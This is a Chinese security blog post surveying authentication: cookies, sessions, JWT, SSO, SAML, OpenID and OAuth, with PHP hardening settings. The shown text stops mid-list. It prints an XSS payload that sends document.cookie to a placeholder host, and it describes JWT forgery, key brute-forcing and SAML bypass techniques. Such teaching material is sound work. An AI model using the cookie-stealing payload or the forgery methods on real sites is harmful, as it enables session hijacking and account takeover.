<!doctype html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">






<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
    
  
  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






  

<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">


  <meta name="keywords" content="web,认证,">





  <link rel="alternate" href="/atom.xml" title="Blog of 1ypt0" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">






<meta name="description" content="提到认证，PKI，X509，cookie，session，Oauth，OpenID，SSO，Ldap，SAML，JWT，NTLM，LM，kerberos……这些名词是绕不过的坎，我们平时接触比较多这些东西，但是如果不做深入的了解，很难把上面认证相关的概念以及涉及到的认证协议搞明白，本文打算对认证相关的东西做个总结。比较零散，不知云云，望见谅。">
<meta name="keywords" content="web,认证">
<meta property="og:type" content="article">
<meta property="og:title" content="认证琐碎">
<meta property="og:url" content="http://lypto.me/2019/04/21/认证琐碎/index.html">
<meta property="og:site_name" content="Blog of 1ypt0">
<meta property="og:description" content="提到认证，PKI，X509，cookie，session，Oauth，OpenID，SSO，Ldap，SAML，JWT，NTLM，LM，kerberos……这些名词是绕不过的坎，我们平时接触比较多这些东西，但是如果不做深入的了解，很难把上面认证相关的概念以及涉及到的认证协议搞明白，本文打算对认证相关的东西做个总结。比较零散，不知云云，望见谅。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/企业拓扑.JPG">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/sessionphp.JPG">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/cookie.JPG">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/browser.JPG">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/sessionpath.JPG">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/jwt.jpg">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/SSO.png">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/openid.JPG">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/csrf.png">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/ntlm-auth.png">
<meta property="og:image" content="http://lypto.me/myimages/认证技术/kerbos.png">
<meta property="og:updated_time" content="2019-04-21T07:07:55.249Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="认证琐碎">
<meta name="twitter:description" content="提到认证，PKI，X509，cookie，session，Oauth，OpenID，SSO，Ldap，SAML，JWT，NTLM，LM，kerberos……这些名词是绕不过的坎，我们平时接触比较多这些东西，但是如果不做深入的了解，很难把上面认证相关的概念以及涉及到的认证协议搞明白，本文打算对认证相关的东西做个总结。比较零散，不知云云，望见谅。">
<meta name="twitter:image" content="http://lypto.me/myimages/认证技术/企业拓扑.JPG">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://lypto.me/2019/04/21/认证琐碎/">





  <title>认证琐碎 | Blog of 1ypt0</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  





  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?75f42badbf01deec39184b95290bc71d";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>











  
  
    
  
  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>
	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Blog of 1ypt0</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://lypto.me/2019/04/21/认证琐碎/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="1ypt0">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/109.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog of 1ypt0">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">认证琐碎</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-21T14:55:26+08:00">
                Apr 21 2019
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/04/21/认证琐碎/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/04/21/认证琐碎/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计</span>
                
                <span title="字数统计">
                  9.2k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  34
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <blockquote>
<p>提到认证，PKI，X509，cookie，session，Oauth，OpenID，SSO，Ldap，SAML，JWT，NTLM，LM，kerberos……这些名词是绕不过的坎，我们平时接触比较多这些东西，但是如果不做深入的了解，很难把上面认证相关的概念以及涉及到的认证协议搞明白，本文打算对认证相关的东西做个总结。比较零散，不知云云，望见谅。<br><a id="more"></a></p>
<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>先对这些认证相关的东东做个简单的归类。PKI，X509是公钥密码领域用来进行公钥认证，管理，分发的机构以及规范；cookie，session，JWT是web领域保持会话状态的；ADS是活动目录服务器系统，与LM，NTLM，kerberos一道与windows认证或windows域认证密不可分；Oauth和OpenID都可以作为认证需求，只不过前者多了授权的概念。SSO是单点登陆，是企业里面使用比较多的概念，实现了SSO的协议有很多，包括kerberos，CAS等，而SAML就作为单点认证过程中的xml数据载体，也可以说是一种协议，提供了协议商定字段规范。咋一看会觉得SSO和Oauth，OpenID有点类似，其实他们很不一样。SSO希望达到的效果是登陆一次在expire期限内访问所有服务，即使是跨域状态。但是Oauth或者OpenID实现的是使用同一平台账号登陆不同服务，这里会有疑问，这样看来不是和SSO一样了吗？其实不然，我们注意到Oauth或者OpenID登陆不同的服务是需要一直授权的，举个例子，我们登陆淘宝和微博是需要授权两次，但是在SSO中就不一样了。举个例子，在公司中我只要认证一次，就可以访问生产网上的所有服务，也可以访问办公网上的一些资源，我们只需要一次认证。这样来看就可以理解二者的不同了。</p>
<p>说到企业内网单点认证，想起前一段时间从导师那“盗”来的一图，现展示如下：</p>
</blockquote>
<p><img src="/myimages/认证技术/企业拓扑.JPG" alt="image"></p>
<h1 id="cookie，session，JWT"><a href="#cookie，session，JWT" class="headerlink" title="cookie，session，JWT"></a>cookie，session，JWT</h1><p>cookie，session, JWT都可以用来记录会话状态，JWT是一种相对前两者比较新的概念，和cookie一样需要保存在客户端，session保存在服务端。这里先主要聊聊cookie和session。</p>
<p>直接看几张图我们就可以对cookie，session的原理有所了解。<br><img src="/myimages/认证技术/sessionphp.JPG" alt="image"></p>
<p><img src="/myimages/认证技术/cookie.JPG" alt="image"></p>
<p><img src="/myimages/认证技术/browser.JPG" alt="image"></p>
<p><img src="/myimages/认证技术/sessionpath.JPG" alt="image"></p>
<p>根据使用习惯有以下几点特性：</p>
<ul>
<li>cookie数据存放在客户的浏览器上，session数据放在服务器上。</li>
<li>cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗考虑到安全应当使用session。将登陆信息等重要信息存放为SESSION，其他信息如果需要保留，可以放在COOKIE中，减轻服务端压力。</li>
<li>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。<h2 id="cookie的六元组的理解"><a href="#cookie的六元组的理解" class="headerlink" title="cookie的六元组的理解"></a>cookie的六元组的理解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name,value,expire,path,domain,secure,httponly)</span><br><span class="line"></span><br><span class="line">1. name和value字段自是不必多说，key-value键值对</span><br><span class="line">2. expire规定了cookie的过期时间</span><br><span class="line">3. path从路径上指定了在请求某个特定的url目录的时候需要发送cookie值到服务端</span><br><span class="line">4. domain则从域名上指定了在访问某个域的时候需要发送cookie值到服务端，默认就是产生cookie时候的域名，在大型的多子域名下的网站可以使用这个字段将domain设置成根域实现cookie共享。</span><br><span class="line">5. secure属性则表明只有当一个请求通过 SSL 或 HTTPS 创建时，包含 secure 选项的 cookie 才能被发送至服务器。这种 cookie 的内容具有很高的价值，如果以纯文本形式传递很有可能被篡改。</span><br><span class="line">6. httponly设置成 TRUE，Cookie 仅可通过 HTTP 协议访问。 这意思就是 Cookie 无法通过类似 JavaScript 这样的脚本语言访问。 要有效减少 XSS攻击时的身份窃取行为，可建议用此设置（虽然不是所有浏览器都支持），不过这个说法经常有争议。 PHP 5.2.0 中添加。 TRUE 或 FALSE</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="会话控制关键配置php-ini"><a href="#会话控制关键配置php-ini" class="headerlink" title="会话控制关键配置php.ini"></a>会话控制关键配置<code>php.ini</code></h2><blockquote>
<p><a href="https://www.php.net/manual/en/session.security.ini.php" target="_blank" rel="noopener">https://www.php.net/manual/en/session.security.ini.php</a></p>
</blockquote>
<p>注意到会话中有一些配置和之前提到的cookie六元组有相似的地方，但是设置的地方不一样，session是通过php配置项直接管理，而cookie在运行时设定，通过set-cookie相应头反馈给客户端。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 有效期</span><br><span class="line">session.cookie_lifetime = 0</span><br><span class="line"></span><br><span class="line"># 有效路径</span><br><span class="line">session.cookie_path = /</span><br><span class="line"></span><br><span class="line"># 有效域</span><br><span class="line">session.cookie_domail=...</span><br><span class="line"></span><br><span class="line"># httponly属性</span><br><span class="line">session.cookie_httponly = 1</span><br><span class="line"></span><br><span class="line"># 防御会话固定，防止session未初始化，默认是0不开启，https://wiki.php.net/rfc/strict_sessions</span><br><span class="line">session.use_strict_mode=0</span><br><span class="line"></span><br><span class="line"># 是否安全传输，仅当使用https传输时才可访问会话</span><br><span class="line">session.cookie_secure = on</span><br><span class="line"></span><br><span class="line"># 表示SESSION技术的实现是否需要依赖COOKIE 1表示是 0表示否。如果开启会话id将只在cookie中存储，避免了url传递会话的攻击。</span><br><span class="line">session.use_only_cookies = 0</span><br><span class="line"></span><br><span class="line"># 表示是否允许使用表单传值的方式传递PHPSESSID 0表示否 1表示是</span><br><span class="line">session.use_trans_sid = 1</span><br><span class="line"></span><br><span class="line"># session的散列函数</span><br><span class="line">session.hash_function=&quot;sha256&quot;</span><br></pre></td></tr></table></figure></p>
<p>下面主要聊聊cookie和session常见的安全问题：</p>
<ol>
<li><p>cookie字段未设置HttpOnly容易被DOM访问，结合xss脚本劫持攻击，利用如下：<br><code>&lt;img src=# onerror=(location.href=&quot;http://yourdomain/xss.php?data=&quot;+document.cookie)&gt;</code></p>
</li>
<li><p>会话固定（session fixation），用户未认证前和认证后的sessionID没有刷新，导致可以利用社工或者XSS等手段达到让其他人用自己已知的sessionID登陆，从何获取受害者会话。</p>
<blockquote>
<p><a href="https://www.owasp.org/index.php/Session_fixation" target="_blank" rel="noopener">https://www.owasp.org/index.php/Session_fixation</a></p>
</blockquote>
</li>
</ol>
<p>笔者一开始以为会话固定是个比较容易被忽视的漏洞点，所以尝试搭建环境复现了解下细节，也尝试了上述链接提到的常见的几种利用手段。但是发现一个问题，要想利用会话固定漏洞，怎么把固定的sessionID注入victim的浏览器中，并且是和所要访问站点是同源态。基于这两个限制，利用的条件变得相当的苛刻。经过一番思考大致可以得到四种思路：</p>
<ul>
<li>中间人劫持，直接注入sessionID</li>
<li>利用同源站点的XSS，在没有设置和httponly条件下，document.cookie直接修改</li>
<li>利用站点CLRF漏洞，注入sessionID</li>
<li>use_only_cookies字段关闭下，URL传递sessionID，php默认开启。</li>
</ul>
<p>当看到php默认开启use_only_cookie，心里拔凉，毕竟前三种利用的前提多多少少有些苛刻，甚至让人绝望。后来经过一番搜索了解到，javaEE默认是支持jsessionid，目的就是避免有些浏览器不支持cookie，这样是为了兼容，如此一来，会话固定就又有了很多的利用价值。这里有一个老哥和我的疑问类似  </p>
<blockquote>
<p><a href="https://julienprog.wordpress.com/2017/08/17/session-id-in-the-url-is-it-a-vulnerability/。" target="_blank" rel="noopener">https://julienprog.wordpress.com/2017/08/17/session-id-in-the-url-is-it-a-vulnerability/。</a>  </p>
</blockquote>
<p>总的来说，尽管sessionID暴露在url存在一定安全隐患，但是为了兼容，也还有不少网站使用这个做法，让会话固定利用有了更低的门槛。同样的，进一步的了解发现，php 子系统session会话固定有一个CVE编号：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4718" target="_blank" rel="noopener">CVE-2011-4718</a>。后来多的改进措施是更新重写了一些函数，并出现了session.use_strict_mode模式。在打开这个模式并且按照官方的实例代码，可以很好的避免会话固定漏洞。<br><code>During Login</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_destory();</span><br><span class="line">session_regenerate_id();</span><br><span class="line">$_SESSION[&apos;valid_id&apos;] = session_id();</span><br></pre></td></tr></table></figure></p>
<p><code>Validation code: Code other than login.</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($_SESSION[&apos;valid_id&apos;] !== session_id()) &#123;</span><br><span class="line">  die(&apos;Invalid use of session ID&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>JWT全名是json web token，和cookie，session一样也是用来会话保持的。与cookie和session机制不同的是，它不需要再服务端保持会话状态，每个JWT完全标识了一个用户的登陆态，并且token完全保存在客户端，在需要访问受访问控制的页面的时候就需要使用token,token可以存储在localstorage或者cookie字段。Token 由头部 (header)、负载 (payload)、签名 (signature) 组成。在很多找回密码或者验证邮箱的功能中，会使用到JWT这一技术，将状态完全保存在客户端，可以很大的释放服务端的资源压力，也使得逻辑线没那么冗长。</p>
<p><img src="/myimages/认证技术/jwt.jpg" alt="image"></p>
<p>有小伙伴可能会对完全保存存在客户端的jwt的安全性存在顾虑，jwt的设计之初的协议是语义安全的。因为服务端有签名的私钥，只有服务端可以签名和验证签名。在使用安全的签名算法的条件下可以保证不可篡改。但是这一顾虑却是很应该的。协议设计没问题，不代表实现没问题（这是一条很实用的定律）。现总结一下常见的jwt认证安全问题。</p>
<blockquote>
<p>需要注意的是jwt中对应的base64并不是一个严格意义上的base64，由于token有可能被做为url，而base64中的<code>+/=</code>三个字符会被转义，导致url变得更长，所以token的base64会将<code>+</code>转化为<code>-</code>、<code>/</code>转化为<code>_</code>、删除<code>=</code>。   </p>
</blockquote>
<h2 id="1-修改认证方式（空认证和HS256认证的缺陷）"><a href="#1-修改认证方式（空认证和HS256认证的缺陷）" class="headerlink" title="1.修改认证方式（空认证和HS256认证的缺陷）"></a>1.修改认证方式（空认证和HS256认证的缺陷）</h2><ul>
<li>如果后端的空认证检测做得不够好，就会造成客户端修改签名方式为<code>none</code>，然后绕过在服务端的签名认证，从未可以实现修改token的目的</li>
<li>如果后台使用RSA私钥进行认证，我们可以把签名换成HS256,然后通过HMAC-SHA256签名算法，使用RSA公钥来进行客户端认证篡改，然后实现任意payload篡改的目的。 </li>
</ul>
<h2 id="2-弱认证方式的暴力破解"><a href="#2-弱认证方式的暴力破解" class="headerlink" title="2.弱认证方式的暴力破解"></a>2.弱认证方式的暴力破解</h2><p>现在GitHub上有一些相对比较成熟的工具，暴力破解HS256签名的JWT，如果签名的key是脆弱的，那么可以直接暴力解出key,然后就可以为所欲为。</p>
<h2 id="3-使用refresh-token和access-token-的非关联性脆弱"><a href="#3-使用refresh-token和access-token-的非关联性脆弱" class="headerlink" title="3.使用refresh token和access token 的非关联性脆弱"></a>3.使用refresh token和access token 的非关联性脆弱</h2><p>授权服务器没有检查refresh令牌&lt;-&gt;访问令牌关联。这意味着我可以用attack的refresh令牌刷新victim的访问令牌。</p>
<h2 id="4-JWT中字段涉数据库查询的注入利用"><a href="#4-JWT中字段涉数据库查询的注入利用" class="headerlink" title="4.JWT中字段涉数据库查询的注入利用"></a>4.JWT中字段涉数据库查询的注入利用</h2><p>这一步骤是指在后台对JWT的payload数据进行了相应的数据库操作，如插入，查询等等，但是却过滤不严谨，在利用JWT的脆弱性后就可以进行任意的sql注入，很多时候为了方便，可以使用sqlmap，自己编写相关temple脚本达到自动化注入。</p>
<blockquote>
<p>上面提到的攻击方式已经集成到了webgoat靶场中，并且网上也有了不少教程这里就不再啰嗦。</p>
</blockquote>
<h1 id="SSO单点认证"><a href="#SSO单点认证" class="headerlink" title="SSO单点认证"></a>SSO单点认证</h1><p>SSO认证最常见的场景是在公司内部实现ACL控制的统一化，一来是增加企业安全性，防止口令泛滥，而来给员工管理或者资源访问带来方便。那么什么是SSO呢？先看下下图：</p>
<p><img src="/myimages/认证技术/SSO.png" alt="image"></p>
<blockquote>
<p>以下内容节选自参考链接[3]</p>
</blockquote>
<ol>
<li>用户访问app系统，app系统是需要登录的，但用户现在没有登录。</li>
<li>跳转到CAS server，即SSO登录系统，以后图中的CAS Server我们统一叫做SSO系统。 SSO系统也没有登录，弹出用户登录页。</li>
<li>用户填写用户名、密码，SSO系统进行认证后，将登录状态写入SSO的session，浏览器（Browser）中写入SSO域下的Cookie。</li>
<li>SSO系统登录完成后会生成一个ST（Service Ticket），然后跳转到app系统，同时将ST作为参数传递给app系统。</li>
<li>app系统拿到ST后，从后台向SSO发送请求，验证ST是否有效。</li>
<li>验证通过后，app系统将登录状态写入session并设置app域下的Cookie。</li>
</ol>
<p>至此，跨域单点登录就完成了。以后我们再访问app系统时，app就是登录的。接下来，我们再看看访问app2系统时的流程。</p>
<ol>
<li>用户访问app2系统，app2系统没有登录，跳转到SSO。</li>
<li>由于SSO已经登录了，不需要重新登录认证。</li>
<li>SSO生成ST，浏览器跳转到app2系统，并将ST作为参数传递给app2。</li>
<li>app2拿到ST，后台访问SSO，验证ST是否有效。</li>
<li>验证成功后，app2将登录状态写入session，并在app2域下写入Cookie</li>
</ol>
<blockquote>
<p>SSO单点认证的实现方式有很多，包括主机认证层面和web服务用户认证层面。上面的交互过程是web用户认证层面的交互细节。后面聊到的Window域认证kerberos协议就是主机认证域服务授权的实现方式。</p>
</blockquote>
<h2 id="SAML"><a href="#SAML" class="headerlink" title="SAML"></a>SAML</h2><blockquote>
<p>有兴趣可以参考SAML的RFC文档</p>
</blockquote>
<p>往简单了说SAML就是一种XML数据格式，定义了规范字段用于单点认证，本身也可以理解为一种协议规范，认证媒介或者数据载体。它作为SSO一种常用的实现方式。我们看看SAML存在的安全隐患。</p>
<ul>
<li><p>分析测试工具<br>SAML Raider bp(<a href="https://github.com/SAMLRaider/SAMLRaider" target="_blank" rel="noopener">https://github.com/SAMLRaider/SAMLRaider</a>)</p>
</li>
<li><p>安全性问题：</p>
</li>
</ul>
<ol>
<li><p>删除签名方式标签，可以绕过认证，源于ssl模式下的认证可选性  </p>
<ul>
<li>例子： <a href="https://hackerone.com/reports/136169" target="_blank" rel="noopener">https://hackerone.com/reports/136169</a>  </li>
</ul>
</li>
<li><p>python-saml组件对于字段的提取忽略标签属性后的值，导致截断，但是在做整体hash校验的时候会先进行规范化忽略注释，导致修改固定字段但saml文件仍旧校验通过。</p>
<ul>
<li>例子：<a href="https://duo.com/labs/psa/duo-psa-2017-003" target="_blank" rel="noopener">https://duo.com/labs/psa/duo-psa-2017-003</a></li>
</ul>
</li>
<li><p>SAML消息过期机制和重放，如果SAML中缺少了消息expiration定义，并且断言ID不是唯一的，那么就容易受到常见的重放攻击。</p>
</li>
</ol>
<h1 id="Oauth与OpenID"><a href="#Oauth与OpenID" class="headerlink" title="Oauth与OpenID"></a>Oauth与OpenID</h1><p>其实本质上来看，openID和Oauth都是SSO的一种变形，或者说是一种拓展实现，其达到的效果在客户端看来都是使用一个账号登陆了很多种服务。但是在服务端这几种方式切入点有不同。SSO的初衷是为了实现ACL收敛到一个入口，方便做权限管理，避免密钥泛滥造成的安全隐患。而OpenID是一种将认证承包给第三方服务的做法，使得服务商可以避免复杂的ID管理，而专注于业务。Oauth其实一开始不是用来做认证的，而是一种授权，举个例子，服务商A和服务商B隶属不同公司，但是A的服务需要用到B服务中的一些资源，这个时候就需要client将A服务的账号和B服务的账号关联，走Oauth的协议实现这一资源请求的授权，只不过到了Oauth 2.0以后，人们发现授权的过程包含了认证的过程，所以干脆就直接可以使用Oauth来进行认证。</p>
<h2 id="OpenID"><a href="#OpenID" class="headerlink" title="OpenID"></a>OpenID</h2><p>国内一般都用Oauth2协议做认证和授权，所以这里只介绍一下OpenID的相关概念。<br>首先介绍概念：</p>
<ul>
<li>End User：终端用户，使用OP与RP的服务</li>
<li>Relying Party依赖方：简称RP，服务提供者，需要OP鉴权终端用户的身份</li>
<li>OpenID Provider：OpenID提供者，简称OP，对用户身份鉴权</li>
<li>Identifier标识符：标识符可以是一个HTTP、HTTPS或者XRI(可扩展的资源标识)</li>
<li>User-Agent：实现了HTTP1.1协议的用户浏览器</li>
<li>OP Endpoint URL：OP鉴权的URL，提供给RP使用</li>
<li>OP Identifier：OP提供给终端用户的一个URI或者XRI,RP根据OP Identifier来解析出OP Endpoint URL与OP Version</li>
<li>User-Supplied Identifier：终端用户使用的ID，可能是OP提供的OpenID，也可以是在RP注册的ID。RP可以根据User-Supplied  </li>
<li>Identifier来解析出OP Endpoint URL、OP Version与OP_Local Identifer</li>
<li>Claimed Identifier：终端用户声明自己身份的一个标志，可以是一个URI或者XRI</li>
<li>OP-Local Identifier：OP提供的局部ID</li>
<li>Oauth在国内用得比较多，这里就重点聊聊Oauth。</li>
</ul>
<p><img src="/myimages/认证技术/openid.JPG" alt="image"></p>
<ol>
<li>终端用户请求登录RP网站，用户选择了以OpenID方式来登录</li>
<li>RP将OpenId的登录界面返回给终端用户</li>
<li>终端用户以OpenID登陆RP网站</li>
<li>RP网站对用户的OpenID进行标准化，此过程非常复杂。由于OpenID可能是URI，也可能是XRI，所以标准化方式各不相同。具体标准化过程是：如果OpenID以xri://、xri://$ip或者xri://$dns开头，先去掉这些符号；然后对如下的字符串进行判断，如果第一个字符是=、@、+、$、!，则视为标准的XRI，否则视为HTTP URL（若没有http,为其增加<a href="http://）。" target="_blank" rel="noopener">http://）。</a></li>
<li>RP发现OP，如果OpenId是XRI，就采用XRI解析，如果是URL，则用Yadis协议解析，若Yadis解析失败，则用Http发现。</li>
<li>RP跟OP建立一个关联。两者之间可以建立一个安全通道，用于传输信息并降低交互次数。</li>
<li>OP处理RP的关联请求</li>
<li>RP请求OP对用户身份进行鉴权</li>
<li>OP对用户鉴权，请求用户进行登录认证</li>
<li>用户登录OP</li>
<li>OP将鉴权结果返回给RP</li>
<li>RP对OP的结果进行分析</li>
</ol>
<h2 id="Oauth"><a href="#Oauth" class="headerlink" title="Oauth"></a>Oauth</h2><p>OpenID是用来认证协议，OAuth是授权协议，二者是互补的。但在国内的使用情况中，Oauth被作为认证进行“滥用”，所以在国内基本都是采用Oauth这种方式进行第三方账号登陆。在学习Oauth之前，需要先了解以下Oauth的发展史。2007年12月4日发布了OAuth Core 1.0， 此版本的协议存在严重的安全漏洞：OAuth Security Advisory: 2009.1。2009年6月24日发布了OAuth Core 1.0 Revision A：此版本的协议修复了前一版本的安全漏洞，并成为RFC5849，我们现在使用的OAuth版本多半都是以此版本为基础。OAuth 2.0是OAuth协议的下一版本，但不向后兼容OAuth 1.0。 OAuth 2.0关注客户端开发者的简易性，同时为Web应用，桌面应用和手机，和起居室设备提供专门的认证流程。</p>
<ul>
<li><p>国内常用的第三方平开放台</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">微博开放平台</span><br><span class="line">http://open.weibo.com</span><br><span class="line">                </span><br><span class="line">微信开放平台</span><br><span class="line">https://open.weixin.qq.com</span><br><span class="line"></span><br><span class="line">QQ互联平台</span><br><span class="line">https://connect.qq.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>Oauth2几个概念：</p>
</li>
</ul>
<ol>
<li>resource owner，资源所有者，能够允许访问受保护资源的实体。如果是个人，被称为 end-user。</li>
<li>resource server，资源服务器，托管受保护资源的服务器。</li>
